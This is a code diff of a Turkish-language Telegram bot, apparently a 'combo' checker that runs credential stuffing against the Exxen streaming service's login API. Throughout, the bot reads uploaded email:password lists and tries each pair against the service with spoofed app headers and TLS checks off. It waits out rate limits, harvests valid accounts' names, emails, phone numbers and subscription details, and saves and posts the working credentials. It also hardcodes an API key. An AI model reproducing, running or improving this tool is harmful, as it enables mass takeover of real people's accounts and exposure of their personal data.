@@ -2,45 +2,20 @@ import os, time
 import sys
 import re
 import asyncio
+import shutil
 import requests
 import json
+from config import DOWNLOAD_DIR
 from datetime import datetime
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, ForceReply
 from pyrogram.errors import FloodWait, MessageNotModified
 from pyrogram import Client, filters
 
-import logging
-logging.basicConfig(level = logging.DEBUG,
-                     format="%(asctime)s - %(name)s - %(message)s - %(levelname)s")
-
-logger = logging.getLogger(__name__)
-
-import pyrogram
-import os
-
-from config import BOT_TOKEN, APP_ID, API_HASH
-
-logging.getLogger('pyrogram').setLevel(logging.WARNING)
-
-if __name__ == '__main__':
-
-    if not os.path.isdir('combo'):
-        os.mkdir('combo')
-
-    plugins = dict(root='plugins')
-
-    app = pyrogram.Client(
-        'Combo',
-        bot_token=BOT_TOKEN,
-        api_id=APP_ID,
-        api_hash=API_HASH
-    )
-
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 session = requests.Session()
 
-directory = "./combo/"
+directory = f"./{DOWNLOAD_DIR}/"
 HitsDocument = "Hits.txt"
 ExxenTellPass = "Exxen TelPass.txt"
 
@@ -48,25 +23,10 @@ key = "90d806464edeaa965b75a40a5c090764"
 api = "api-crm.exxen.com"
 
 
-def write(hits):
-    file = open(HitsDocument, 'a+', encoding="utf8")
-    file.write(hits)
-    file.close()
-
-
-def tellpass(tell):
+def tel_write(tell):
     file = open(ExxenTellPass, 'a+', encoding="utf8")
     file.write(tell)
     file.close()
-
-
-def find_between(s, first, last):
-    try:
-        start = s.index(first) + len(first)
-        end = s.index(last, start)
-        return s[start:end]
-    except ValueError:
-        return ""
 
 
 headers = {
@@ -78,6 +38,8 @@ headers = {
     "Origin": "com.exxen.ios",
     "Content-Type": "application/json;charset=utf-8",
 }
+
+regex = r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$)"
 
 
 def replace(string, substitutions):
@@ -97,6 +59,21 @@ substitutions = {
 }
 
 
+@Client.on_message(filters.command('combo'))
+async def cookie(client, message):
+    if not message.reply_to_message:
+        await message.reply_text("Reply combo.txt", quote=True)
+        return
+    file_name = message.reply_to_message.document.file_name
+    filename, file_extension = os.path.splitext(file_name)
+    if message.reply_to_message.media and message.reply_to_message.document and file_extension == '.txt':
+        await client.download_media(
+            message=message.reply_to_message,
+            file_name=DOWNLOAD_DIR + '/',
+        )
+        await message.reply_text(f"Combo eklendi.\n{file_name}", quote=True)
+    else:
+        await message.reply_text("Get combo", quote=True)
 
 
 @Client.on_message(filters.command(['start']))
@@ -113,6 +90,7 @@ async def help_message(app, message):
 
         await message.reply("Choose Combo: ", reply_markup=ForceReply(True))
 
+
 @Client.on_message(filters.reply)
 async def api_connect(client, message):
     custom = 0
@@ -121,10 +99,9 @@ async def api_connect(client, message):
     cpm = 1
     done = 0
     if (message.reply_to_message.reply_markup) and isinstance(message.reply_to_message.reply_markup, ForceReply):
+        msg = await message.reply_text("**✓ İşlem Başlatılıyor..**", reply_to_message_id=message.message_id)
         try:
-            msg = await message.reply_text("**✓ İşlem Başlatılıyor..**", reply_to_message_id=message.message_id)
             dsyno = int(message.text)
-            print(dsyno)
             say = 0
             for files in os.listdir(directory):
                 say = say + 1
@@ -139,16 +116,15 @@ async def api_connect(client, message):
                 mp = mr.replace("\n", "")
                 USER = mp.split(':')[0]
 
-                check_number = str(USER[:1])
-
-                if check_number.isnumeric():
+                if re.match(regex, USER):
+                    check = 'Email'
+                else:
+                    check_number = str(USER[:1])
                     check = 'Mobile'
                     if check_number == '0':
                         USER = '+9' + USER
                     else:
                         USER = '+90' + USER
-                else:
-                    check = 'Email'
 
                 try:
                     PASS = mp.split(':')[1]
@@ -162,62 +138,92 @@ async def api_connect(client, message):
 
                 while True:
                     try:
-                        res = session.post(url, headers=headers, data=json.dumps(data), timeout=15, verify=False)
+                        response = session.post(
+                            url,
+                            headers=headers,
+                            data=json.dumps(data),
+                            timeout=10,
+                            verify=False
+                        )
+                        if response.status_code == 429:
+                            await asyncio.sleep(120)
                         break
                     except requests.exceptions.Timeout as e:
                         print(e)
 
-                # print (res.content)
-                Res = str(res.text)
                 total = total + 1
-
                 cpm = (time.time() - cpm)
                 cpm = (round(60 / cpm))
                 Exxen = str()
                 done += 1
-                if "CreateDate" in Res:
-                    Name = find_between(str(Res), ',"Name":"', '"')
-                    Surname = find_between(str(Res), ',"Surname":"', '"')
+                package = 0
 
-                    if "LicenseName" in Res:
-                        Package = find_between(str(Res), ',"LicenseName":"', '"')
-                        Package = replace(Package, substitutions)
-                        if "SPOR" in Res:
-                            Exxen += "\n╠●⚽ <b>Spor Paket:</b> ✓"
+                if response.ok:
+                    res = response.json()
+                    succes = res["Result"]
+                    if succes is not None:
+                        data = json.dumps(succes, indent=4, sort_keys=True)
+                        parse = json.loads(data)
 
-                    if "LicenseStartDate" in Res:
-                        hit = hit + 1
-                        Package_Start = find_between(str(Res), ',"LicenseStartDate":"', '"')
-                        Package_End = find_between(str(Res), ',"LicenseEndDate":"', '"')
-                        start = datetime.fromisoformat(Package_Start)
-                        end = datetime.fromisoformat(Package_End)
-                        Exxen += ("\n╠●📆 <b>Başlangıç:</b> " + str(start) + "\n" + "╠●📆 <b>Bitiş:</b> " + str(end))
-                    else:
-                        custom = custom + 1
-                        Package = "Custom ¯\_(ツ)_/¯"
+                        user = parse['User']
+                        Email = user['Email']
+                        Name = user['Name']
+                        Surname = user['Surname']
+                        Mobile = user['Mobile']
+                        CreateDate = user['CreateDate']
+                        CreateDate = datetime.fromisoformat(CreateDate)
 
-                    if "Number" in Res:
-                        Tel = find_between(str(Res), ',"Number":"+90', '"')
-                        tellpass(Tel + ":" + PASS + "\n")
-                        Exxen += ("\n╠●📞 <b>Tel:</b> " + "<code>" + Tel + "</code>")
+                        Exxen += (f"●►👤 **Ad-Soyad:** {Name} {Surname}" + "\n"
+                                  f"╠●✉ **{check}:** `{Email}`" + "\n"
+                                  f"╠●🔑 **Şifre:** `{PASS}`" + "\n"
+                                  )
 
-                    if Package is not None:
-                        Exxen += (
-                                f"\n╠●👤 <b>Ad-Soyad:</b> {Name} {Surname}\n╠●✉ <b>{check}:</b> " +
-                                "<code>" + USER + "</code>" + "\n" + "╠●🔑 <b>Şifre:</b> " + "<code>" + PASS + "</code>" +
-                                "\n" + "╠●💎 <b>Paket:</b> " + Package)
-                        print(Exxen + "\n")
-                        await message.reply_text("╔╣ <b>𝙀𝙓𝙓𝙀𝙉</b>" + Exxen + "\n╚ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ ᴬᶜᵘⁿ╝", parse_mode='HTML')
-                        write(Exxen + "\n")
+                        if Mobile is not None:
+                            Number = Mobile['Number']
+                            tel_write(f"{Number}:{PASS}" + "\n")
+                            Exxen += f"╠●📞 **Tel:** {Number}" + "\n"
+
+                        Exxen += f"╠●🗓 **H.o.t:** {CreateDate}" + "\n"
+
+                        if parse['Products']:
+                            hit = hit + 1
+                            for product in parse['Products']:
+                                package = package + 1
+                                LicenseName = product['LicenseName']
+                                PurchaseDate = product['LicenseStartDate']
+                                ExpireDate = product['LicenseEndDate']
+
+                                StartDate = datetime.fromisoformat(PurchaseDate)
+                                EndDate = datetime.fromisoformat(ExpireDate)
+                                Package = replace(LicenseName, substitutions)
+
+                                Exxen += ("║\n"
+                                          f"╠●💎 **Paket[{package}]:** {Package}" + "\n"
+                                          f"╠●⌛ **Başlangıç:** {StartDate}" + "\n"
+                                          f"╠●⏳ **Bitiş:** {EndDate}" + "\n"
+                                          )
+                        else:
+                            custom = custom + 1
+                        print(Exxen.replace('**', ''))
+                        try:
+                            await message.reply_text(
+                                "╔╣ **𝙀𝙓𝙓𝙀𝙉**" + Exxen + "╚ ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ ᴬᶜᵘⁿ ╝",
+                                parse_mode='Markdown')
+                        except FloodWait as e:
+                            time.sleep(e.x * 3 / 2)
                 else:
-                    print(mp + " Cpm: " + str(cpm) + " Taranan: " + str(total))
+                    print(f"{mp} Cpm: {cpm} Taranan: {total}")
                     cpm = time.time()
-                if not done % 20:
-                    try:
-                      await msg.edit(f"Tamamlanan: {done}")
-                    except MessageNotModified:
-                      pass
-        finally:
-            await message.reply_text("**✓ İşlem Başarıyla Tamamlandı**" + "\n" + "➤ Total: " + str(total) + " Hit: " + str(hit) + " Custom: " + str(custom))
+                    if not done % 20:
+                        try:
+                            await msg.edit(f"**Taranan:** {done}")
+                        except FloodWait as e:
+                            time.sleep(e.x * 3 / 2)
+                        except MessageNotModified:
+                            pass
 
-app.run()
+        finally:
+            await message.reply_text(
+                f"**✓ İşlem Başarıyla Tamamlandı**" + "\n"
+                f"➤ **Total:** `{total}` **Hit:** `{hit}` **Custom:** `{custom}`"
+            )
